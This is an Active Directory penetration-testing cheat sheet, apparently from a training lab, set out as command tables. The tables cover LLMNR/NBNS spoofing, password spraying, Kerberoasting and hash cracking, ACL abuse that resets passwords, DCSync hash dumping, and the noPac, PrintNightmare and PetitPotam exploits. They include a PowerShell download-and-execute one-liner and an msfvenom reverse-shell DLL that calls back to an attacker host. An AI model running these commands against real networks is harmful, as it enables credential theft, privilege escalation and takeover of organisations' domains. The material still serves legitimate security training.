| `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`    | Starts `Inveigh` on a Windows-based host with LLMNR & NBNS spoofing enabled and outputs the results to a file. |
| `.\Inveigh.exe`                                              | Starts the `C#` implementation of `Inveigh` from a Windows-based host. |
| `$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey \|foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}` | PowerShell script used to disable NBT-NS on a Windows host.  |



# Password Spraying & Password Policies

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `{% raw %}#!/bin/bash  for x in {{%A..Z%},{%0..9%}}{{%A..Z%},{%0..9%}}{{%A..Z%},{%0..9%}}{{%A..Z%},{%0..9%}}     do echo $x; done{% endraw %}` | Bash script used to generate `16,079,616` possible username combinations from a Linux-based host. |
| `crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol` | Uses `CrackMapExec`and valid credentials (`avazquez:Password123`) to enumerate the password policy (`--pass-pol`) from a Linux-based host. |
| `rpcclient -U "" -N 172.16.5.5`                              | Uses `rpcclient` to discover information about the domain through `SMB NULL` sessions. Performed from a Linux-based host. |
| `rpcclient $> querydominfo`                                  | Uses `rpcclient` to enumerate the password policy in a target Windows domain from a Linux-based host. |
| `enum4linux  -P 172.16.5.5`                                  | Uses `enum4linux` to enumerate the password policy (`-P`) in a target Windows domain from a Linux-based host. |
| `enum4linux-ng -P 172.16.5.5 -oA ilfreight`                  | Uses `enum4linux-ng` to enumerate the password policy (`-P`) in a target Windows domain from a Linux-based host, then presents the output in YAML & JSON saved in a file proceeding the `-oA` option. |
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" \| grep -m 1 -B 10 pwdHistoryLength` | Uses `ldapsearch` to enumerate the password policy in a  target Windows domain from a Linux-based host. |
| `net accounts`                                               | Used to enumerate the password policy in a Windows domain from a Windows-based host. |
| `Import-Module .\PowerView.ps1`                              | Uses the Import-Module cmd-let to import the `PowerView.ps1` tool from a Windows-based host. |
| `Get-DomainPolicy`                                           | Used to enumerate the password policy in a target Windows domain from a Windows-based host. |
| `enum4linux -U 172.16.5.5  \| grep "user:" \| cut -f2 -d"[" \| cut -f1 -d"]"` | Uses `enum4linux` to discover user accounts in a target Windows domain, then leverages `grep` to filter the output to just display the user from a Linux-based host. |
| `rpcclient -U "" -N 172.16.5.5  rpcclient $> enumdomuser`    | Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host. |
| `crackmapexec smb 172.16.5.5 --users`                        | Uses `CrackMapExec` to discover users (`--users`) in a target Windows domain from a Linux-based host. |
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  \| grep sAMAccountName: \| cut -f2 -d" "` | Uses `ldapsearch` to discover users in a target Windows doman, then filters the output using `grep` to show only the `sAMAccountName` from a Linux-based host. |
| `./windapsearch.py --dc-ip 172.16.5.5 -u "" -U`              | Uses the python tool `windapsearch.py` to discover users in a target Windows domain from a Linux-based host. |
| `for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 \| grep Authority; done` | Bash one-liner used to perform a password spraying attack using `rpcclient` and a list of users (`valid_users.txt`) from a Linux-based host. It also filters out failed attempts to make the output cleaner. |
| `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1` | Uses `kerbrute` and a list of users (`valid_users.txt`) to perform a password spraying attack against a target Windows domain from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \| grep +` | Uses `CrackMapExec` and a list of users (`valid_users.txt`) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using `grep`. |
| ` sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123` | Uses `CrackMapExec` to validate a set of credentials from a Linux-based host. |
| `sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf \| grep +` | Uses `CrackMapExec` and the -`-local-auth` flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using `grep`. |
| `Import-Module .\DomainPasswordSpray.ps1`                    | Used to import the PowerShell-based tool `DomainPasswordSpray.ps1` from a Windows-based host. |
| `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue` | Performs a password spraying attack and outputs (-OutFile) the results to a specified file (`spray_success`) from a Windows-based host. |

# Enumerating Security Controls

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-MpComputerStatus`                                       | PowerShell cmd-let used to check the status of `Windows Defender Anti-Virus` from a Windows-based host. |
| `Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections` | PowerShell cmd-let used to view `AppLocker` policies from a Windows-based host. |
| `$ExecutionContext.SessionState.LanguageMode`                | PowerShell script used to discover the `PowerShell Language Mode` being used on a Windows-based host. Performed from a Windows-based host. |
| `Find-LAPSDelegatedGroups`                                   | A `LAPSToolkit` function that discovers `LAPS Delegated Groups` from a Windows-based host. |
| `Find-AdmPwdExtendedRights`                                  | A `LAPSTookit` function that checks the rights on each computer with LAPS enabled for any groups with read access and users with `All Extended Rights`. Performed from a Windows-based host. |
| `Get-LAPSComputers`                                          | A `LAPSToolkit` function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host. |



# Credentialed Enumeration 



| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25` | Connects to a Windows target using valid credentials. Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users` | Authenticates with a Windows target over `smb` using valid credentials and attempts to discover more users (`--users`) in a target Windows domain. Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups` | Authenticates with a Windows target over `smb` using valid credentials and attempts to discover groups (`--groups`) in a target Windows domain. Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users` | Authenticates with a Windows target over `smb` using valid credentials and attempts to check for a list of logged on users (`--loggedon-users`) on the target Windows host. Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares` | Authenticates with a Windows target over `smb` using valid credentials and attempts to discover any smb shares (`--shares`). Performed from a Linux-based host. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share` | Authenticates with a Windows target over `smb` using valid credentials and utilizes the CrackMapExec module (`-M`) `spider_plus` to go through each readable share (`Dev-share`) and list all readable files.  The results are outputted in `JSON`. Performed from a Linux-based host. |
| `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5` | Enumerates the target Windows domain using valid credentials and lists shares & permissions available on each within the context of the valid credentials used and the target Windows host (`-H`). Performed from a Linux-based host. |
| `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only` | Enumerates the target Windows domain using valid credentials and performs a recursive listing (`-R`) of the specified share (`SYSVOL`) and only outputs a list of directories (`--dir-only`) in the share. Performed from a Linux-based host. |
| ` rpcclient $> queryuser 0x457`                              | Enumerates a target user account in a Windows domain using its relative identifier (`0x457`). Performed from a Linux-based host. |
| `rpcclient $> enumdomusers`                                  | Discovers user accounts in a target Windows domain and their associated relative identifiers (`rid`). Performed from a Linux-based host. |
| `psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  ` | Impacket tool used to connect to the `CLI`  of a Windows target via the `ADMIN$` administrative share with valid credentials. Performed from a Linux-based host. |
| `wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  ` | Impacket tool used to connect to the `CLI` of a Windows target via `WMI` with valid credentials. Performed from a Linux-based host. |
| `windapsearch.py -h`                                         | Used to display the options and functionality of windapsearch.py. Performed from a Linux-based host. |
| `python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 --da` | Used to enumerate the domain admins group (`--da`) using a valid set of credentials on a target Windows domain. Performed from a Linux-based host. |
| `python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 -PU` | Used to perform a recursive search (`-PU`) for users with nested permissions using valid credentials. Performed from a Linux-based host. |
| `sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all` | Executes the python implementation of BloodHound (`bloodhound.py`) with valid credentials and specifies a name server (`-ns`) and target Windows domain (`inlanefreight.local`)  as well as runs all checks (`-c all`). Runs using valid credentials. Performed from a Linux-based host. |

# Enumeration by Living Off the Land

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-Module`                                                 | PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host. |
| `Import-Module ActiveDirectory`                              | Loads the `Active Directory` PowerShell module from a Windows-based host. |
| `Get-ADDomain`                                               | PowerShell cmd-let used to gather Windows domain information from a Windows-based host. |
| `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName` | PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by `ServicePrincipalName`. Performed from a Windows-based host. |
| `Get-ADTrust -Filter *`                                      | PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (`-Filter *`). Performed from a Windows-based host. |
| `Get-ADGroup -Filter * \| select name`                        | PowerShell cmd-let used to enumerate groups in a target Windows domain and filters by the name of the group (`select name`). Performed from a Windows-based host. |
| `Get-ADGroup -Identity "Backup Operators"`                   | PowerShell cmd-let used to search for a specifc group (`-Identity "Backup Operators"`). Performed from a Windows-based host. |
| `Get-ADGroupMember -Identity "Backup Operators"`             | PowerShell cmd-let used to discover the members of a specific group (`-Identity "Backup Operators"`). Performed from a Windows-based host. |
| `Export-PowerViewCSV`                                        | PowerView script used to append results to a `CSV` file. Performed from a Windows-based host. |
| `ConvertTo-SID`                                              | PowerView script used to convert a `User` or `Group` name to it's `SID`. Performed from a Windows-based host. |
| `Get-DomainSPNTicket`                                        | PowerView script used to request the kerberos ticket for a specified service principal name (`SPN`). Performed from a Windows-based host. |
| `Get-Domain`                                                 | PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host. |
| `Get-DomainController`                                       | PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host. |
| `Get-DomainUser`                                             | PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host. |
| `Get-DomainComputer`                                         | PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host. |
| `Get-DomainGroup`                                            | PowerView script used to eturn all groups or specific group objects in AD. Performed from a Windows-based host. |
| `Get-DomainOU`                                               | PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host. |
| `Find-InterestingDomainAcl`                                  | PowerView script used to find object `ACLs` in the domain with modification rights set to non-built in objects. Performed from a Windows-based host. |
| `Get-DomainGroupMember`                                      | PowerView script used to return the members of a specific domain group. Performed from a Windows-based host. |
| `Get-DomainFileServer`                                       | PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host. |
| `Get-DomainDFSShare`                                         | PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host. |
| `Get-DomainGPO`                                              | PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host. |
| `Get-DomainPolicy`                                           | PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host. |
| `Get-NetLocalGroup`                                          | PowerView script used to  enumerate local groups on a local or remote machine. Performed from a Windows-based host. |
| `Get-NetLocalGroupMember`                                    | PowerView script enumerate members of a specific local group. Performed from a Windows-based host. |
| `Get-NetShare`                                               | PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host. |
| `Get-NetSession`                                             | PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host. |
| `Test-AdminAccess`                                           | PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host. |
| `Find-DomainUserLocation`                                    | PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host. |
| `Find-DomainShare`                                           | PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host. |
| `Find-InterestingDomainShareFile`                            | PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host. |
| `Find-LocalAdminAccess`                                      | PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host. |
| `Get-DomainTrust`                                            | PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host. |
| `Get-ForestTrust`                                            | PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host. |
| `Get-DomainForeignUser`                                      | PowerView script that enumerates users who are in groups outside of the user's domain. Performed from a Windows-based host. |
| `Get-DomainForeignGroupMember`                               | PowerView script that enumerates groups with users outside of the group's domain and returns each foreign member. Performed from a Windows-based host. |
| `Get-DomainTrustMapping`                                     | PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host. |
| `Get-DomainGroupMember -Identity "Domain Admins" -Recurse`   | PowerView script used to list all the members of a target group (`"Domain Admins"`) through the use of the recurse option (`-Recurse`). Performed from a Windows-based host. |
| `Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName` | PowerView script used to find users on the target Windows domain that have the `Service Principal Name` set. Performed from a Windows-based host. |
| `.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data`          | Runs a tool called `Snaffler` against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host. |

# Transfering Files

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `sudo python3 -m http.server 8001`                           | Starts a python web server for quick hosting of files. Performed from a Linux-basd host. |
| `"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"` | PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host. |
| `impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/` | Starts a impacket `SMB` server for quick hosting of a file. Performed from a Windows-based host. |



# Kerberoasting 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `sudo python3 -m pip install .`                              | Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host. |
| `GetUserSPNs.py -h`                                          | Impacket tool used to display the options and functionality of `GetUserSPNs.py` from a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday` | Impacket tool used to get a list of `SPNs` on the target Windows domain from  a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request` | Impacket tool used to download/request (`-request`) all TGS tickets for offline processing from a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev` | Impacket tool used to download/request (`-request-user`) a TGS ticket for a specific user account (`sqldev`) from a Linux-based host. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs` | Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (`-outputfile sqldev_tgs`) linux-based host. |
| `hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force` | Attempts to crack the Kerberos (`-m 13100`) ticket hash (`sqldev_tgs`) using `hashcat` and a wordlist (`rockyou.txt`) from a Linux-based host. |
| `setspn.exe -Q */*`                                          | Used to enumerate `SPNs` in a target Windows domain from a Windows-based host. |
| `Add-Type -AssemblyName System.IdentityModel  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"` | PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host. |
| `setspn.exe -T INLANEFREIGHT.LOCAL -Q */* \| Select-String '^CN' -Context 0,1 \| % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }` | Used to download/request all TGS tickets from a WIndows-based host. |
| `mimikatz # base64 /out:true`                                | `Mimikatz` command that ensures TGS tickets are extracted in `base64` format from a Windows-based host. |
| `kerberos::list /export `                                    | `Mimikatz` command used to extract the TGS tickets from a Windows-based host. |
| `echo "<base64 blob>" \|  tr -d \\n `                         | Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host. |
| `cat encoded_file \| base64 -d > sqldev.kirbi`                 | Used to output a file (`encoded_file`) into a .kirbi file in base64 (`base64 -d > sqldev.kirbi`) format from a Linux-based host. |
| `python2.7 kirbi2john.py sqldev.kirbi`                       | Used to extract the `Kerberos ticket`. This also creates a file called `crack_file` from a Linux-based host. |
| `sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat` | Used to modify the `crack_file` for `Hashcat` from a Linux-based host. |
| `cat sqldev_tgs_hashcat `                                    | Used to view the prepared hash from a Linux-based host.      |
| `hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt ` | Used to crack the prepared Kerberos ticket hash (`sqldev_tgs_hashcat`) using a wordlist (`rockyou.txt`) from a Linux-based host. |
| `Import-Module .\PowerView.ps1  Get-DomainUser * -spn \| select samaccountname` | Uses PowerView tool to extract `TGS Tickets` . Performed from a Windows-based host. |
| `Get-DomainUser -Identity sqldev \| Get-DomainSPNTicket -Format Hashcat` | PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for `Hashcat` from a Windows-based host. |
| `Get-DomainUser * -SPN \| Get-DomainSPNTicket -Format Hashcat \| Export-Csv .\ilfreight_tgs.csv -NoTypeInformation` | Exports all TGS tickets to a `.CSV` file (`ilfreight_tgs.csv`) from a Windows-based host. |
| `cat .\ilfreight_tgs.csv`                                    | Used to view the contents of the .csv file from a Windows-based host. |
| `.\Rubeus.exe`                                               | Used to view the options and functionality possible with the tool `Rubeus`. Performed from a Windows-based host. |
| `.\Rubeus.exe kerberoast /stats`                             | Used to check the kerberoast stats (`/stats`) within the target Windows domain from a Windows-based host. |
| `.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap` | Used to request/download TGS tickets for accounts with the `admin` count set to `1` then formats the output in an easy to view & crack manner (`/nowrap`) . Performed from a Windows-based host. |
| `.\Rubeus.exe kerberoast /user:testspn /nowrap`              | Used to request/download a TGS ticket for a specific user (`/user:testspn`) the formats the output in an easy to view & crack manner (`/nowrap`). Performed from a Windows-based host. |
| `Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes` | PowerView tool used to check the `msDS-SupportedEncryptionType` attribute associated with a specific user account (`testspn`). Performed from a Windows-based host. |
| `hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt` | Used to attempt to crack the ticket hash using a wordlist (`rockyou.txt`) from a Linux-based host . |



# ACL Enumeration & Tactics 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Find-InterestingDomainAcl`                                  | PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host. |
| `Import-Module .\PowerView.ps1  $sid = Convert-NameToSid wley` | Used to import PowerView and retrieve the `SID` of a specific user account (`wley`) from a Windows-based host. |
| `Get-DomainObjectACL -Identity * \| ? {$_.SecurityIdentifier -eq $sid}` | Used to find all Windows domain objects that the user has rights over by mapping the user's `SID` to the `SecurityIdentifier` property from a Windows-based host. |
| `$guid= "00299570-246d-11d0-a768-00aa006e0529"   Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * \| Select Name,DisplayName,DistinguishedName,rightsGuid \| ?{$_.rightsGuid -eq $guid} \| fl` | Used to perform a reverse search & map to a `GUID` value from a Windows-based host. |
| `Get-DomainObjectACL -ResolveGUIDs -Identity * \| ? {$_.SecurityIdentifier -eq $sid} ` | Used to discover a domain object's ACL by performing a search based on GUID's (`-ResolveGUIDs`) from a Windows-based host. |
| `Get-ADUser -Filter * \| Select-Object -ExpandProperty SamAccountName > ad_users.txt` | Used to discover a group of user accounts in a target Windows domain and add the output to a text file (`ad_users.txt`) from a Windows-based host. |
| `foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" \| Select-Object Path -ExpandProperty Access \| Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}` | A `foreach loop` used to retrieve ACL information for each domain user in a target Windows domain by feeding each list of a text file(`ad_users.txt`) to the `Get-ADUser` cmdlet, then enumerates access rights of those users. Performed from a Windows-based host. |
| `$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) ` | Used to create a `PSCredential Object` from a Windows-based host. |
| `$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force` | Used to create a `SecureString Object` from a Windows-based host. |
| `Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose` | PowerView tool used to change the password of a specifc user (`damundsen`) on a target Windows domain from a Windows-based host. |
| `Get-ADGroup -Identity "Help Desk Level 1" -Properties * \| Select -ExpandProperty Members` | PowerView tool used view the members of a target security group (`Help Desk Level 1`) from a Windows-based host. |
| `Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose` | PowerView tool used to add a specifc user (`damundsen`) to a specific security group (`Help Desk Level 1`) in a target Windows domain from a Windows-based host. |
| `Get-DomainGroupMember -Identity "Help Desk Level 1" \| Select MemberName` | PowerView tool used to view the members of a specific security group (`Help Desk Level 1`) and output only the username of each member (`Select MemberName`) of the group from a Windows-based host. |
| `Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose` | PowerView tool used create a fake `Service Principal Name` given a sepecift user (`adunn`) from a Windows-based host. |
| `Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose` | PowerView tool used to remove the fake `Service Principal Name` created during the attack from a Windows-based host. |
| `Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose` | PowerView tool used to remove a specific user (`damundsent`) from a specific security group (`Help Desk Level 1`) from a Windows-based host. |
| `ConvertFrom-SddlString`                                     | PowerShell cmd-let used to covert an `SDDL string` into a readable format. Performed from a Windows-based host. |



# DCSync 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-DomainUser -Identity adunn  \| select samaccountname,objectsid,memberof,useraccountcontrol \|fl` | PowerView tool used to view the group membership of a specific user (`adunn`) in a target Windows domain. Performed from a Windows-based host. |
| `$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs \| ? { ($_.ObjectAceType -match 'Replication-Get')} \| ?{$_.SecurityIdentifier -match $sid} \| select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType \| fl` | Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool `Get-ObjectAcl` to check a specific user's replication rights. Performed from a Windows-based host. |
| `secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 -use-vss` | Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (`172.16.5.5`) and save the extracted hashes to an file (`inlanefreight_hashes`). Performed from a Linux-based host. |
| `mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator` | Uses `Mimikatz` to perform a `dcsync` attack from a Windows-based host. |



# Privileged Access 

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"` | PowerView based tool to used to enumerate the `Remote Desktop Users` group on a Windows target (`-ComputerName ACADEMY-EA-MS01`) from a Windows-based host. |
| `Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"` | PowerView based tool to used to enumerate the `Remote Management Users` group on a Windows target (`-ComputerName ACADEMY-EA-MS01`) from a Windows-based host. |
| `$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force` | Creates a variable (`$password`) set equal to the password (`Klmcargo2`) of a user from a Windows-based host. |
| `$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)` | Creates a variable (`$cred`) set equal to the username (`forend`) and password (`$password`) of a target domain account from a Windows-based host. |
| `Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred` | Uses the PowerShell cmd-let `Enter-PSSession` to establish a PowerShell session with a target over the network (`-ComputerName ACADEMY-EA-DB01`) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior (`$cred` & `$password`). |
| `evil-winrm -i 10.129.201.234 -u forend`                     | Used to establish a PowerShell session with a Windows target from a Linux-based host using `WinRM`. |
| `Import-Module .\PowerUpSQL.ps1`                             | Used to import the `PowerUpSQL` tool.                        |
| `Get-SQLInstanceDomain`                                      | PowerUpSQL tool used to enumerate SQL server instances from a Windows-based host. |
| `Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'` | PowerUpSQL tool used to connect to connect to a SQL server and query the version (`-query 'Select @@version'`) from a Windows-based host. |
| `mssqlclient.py`                                             | Impacket tool used to display the functionality and options provided with `mssqlclient.py` from a Linux-based host. |
| `mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth` | Impacket tool used to connect to a MSSQL server from a Linux-based host. |
| `SQL> help`                                                  | Used to display mssqlclient.py options once connected to a MSSQL server. |
| `SQL> enable_xp_cmdshell`                                   | Used to enable `xp_cmdshell stored procedure` that allows for executing OS commands via the database from a Linux-based host. |
| `xp_cmdshell whoami /priv`                                   | Used to enumerate rights on a system using `xp_cmdshell`.    |



# NoPac

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `sudo git clone https://github.com/Ridter/noPac.git`         | Used to clone a `noPac` exploit using git. Performed from a Linux-based host. |
| `sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap` | Runs `scanner.py` to check if a target system is vulnerable to `noPac`/`Sam_The_Admin` from a Linux-based host. |
| `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap` | Used to exploit the `noPac`/`Sam_The_Admin`  vulnerability and gain a SYSTEM shell (`-shell`). Performed from a Linux-based host. |
| `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator` | Used to exploit the `noPac`/`Sam_The_Admin`  vulnerability and perform a `DCSync` attack against the built-in Administrator account on a Domain Controller from a Linux-based host. |



# PrintNightmare

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `git clone https://github.com/cube0x0/CVE-2021-1675.git`     | Used to clone a PrintNightmare exploit  using git from a Linux-based host. |
| `pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install` | Used to ensure the exploit author's (`cube0x0`) version of Impacket is installed. This also uninstalls any previous Impacket version on a Linux-based host. |
| `rpcdump.py @172.16.5.5 \| egrep 'MS-RPRN\|MS-PAR'`            | Used to check if a Windows target has `MS-PAR` & `MSRPRN` exposed from a Linux-based host. |
| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll` | Used to generate a DLL payload to be used by the exploit to gain a shell session. Performed from a Windows-based host. |
| `sudo smbserver.py -smb2support CompData /path/to/backupscript.dll` | Used to create an SMB server and host a shared folder (`CompData`) at the specified location on the local linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host. Performed from a Linux-based host. |
| `sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'` | Executes the exploit and specifies the location of the DLL payload. Performed from a Linux-based host. |



# PetitPotam

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController` | Impacket tool used to create an `NTLM relay` by specifiying the web enrollment URL for the `Certificate Authority` host. Perfomred from a Linux-based host. |
| `git clone https://github.com/topotam/PetitPotam.git`        | Used to clone the `PetitPotam` exploit using git. Performed from a Linux-based host. |
| `python3 PetitPotam.py 172.16.5.225 172.16.5.5`              | Used to execute the PetitPotam exploit by  specifying the IP address of the attack host (`172.16.5.255`) and the target Domain Controller (`172.16.5.5`). Performed from a Linux-based host. |
